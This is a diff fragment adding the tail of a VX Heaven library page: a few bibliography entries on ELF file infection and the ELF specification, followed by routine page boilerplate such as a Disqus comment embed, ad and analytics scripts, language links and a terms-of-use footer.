+	<li>herm1t, <a href="/lib/vhe00.html">Infecting ELF-files using function padding for Linux</a>, 2006</li>
+	<li>S. Cesare, <a href="/lib/vsc01.html">Unix ELF parasites and virus</a>, 1998</li>
+	<li>TIS Committee, Executable and Linking Format (ELF) Specification Version 1.2, 1995</li>
+	<li>http://directory.fsf.org/libelf.html</li>
+</ol>
+[<a style="" href="/lib/?lang=FR&amp;index=UN#vmk00">Back to index</a>] [<a href="/lib/vmk00.html#disqus_thread">Comments</a>]<br />    <div id="disqus_thread"></div>
+    <script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+
+
+
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vmk00">de</a><a href="/lib/index.php?lang=en&amp;id=vmk00">en</a><a href="/lib/index.php?lang=es&amp;id=vmk00">es</a><a href="/lib/index.php?lang=it&amp;id=vmk00">it</a><a href="/lib/index.php?lang=fr&amp;id=vmk00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vmk00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vmk00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vmk00">ua</a></div>
+</body>
+</html>
